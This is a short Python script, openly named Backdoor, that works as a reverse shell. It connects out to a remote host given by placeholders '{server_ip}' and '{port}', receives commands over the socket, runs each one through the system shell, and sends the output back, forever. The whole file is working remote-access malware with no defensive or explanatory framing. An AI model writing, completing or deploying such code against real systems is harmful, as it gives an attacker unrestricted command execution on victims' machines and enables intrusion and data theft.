import socket
import subprocess
import os

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024).decode()
            try:
                result = self.execute_system_command(command)
                self.connection.send(result)
            except:
                self.connection.send("Error executing command\n".encode())

backdoor = Backdoor("{server_ip}", {port})
backdoor.run()
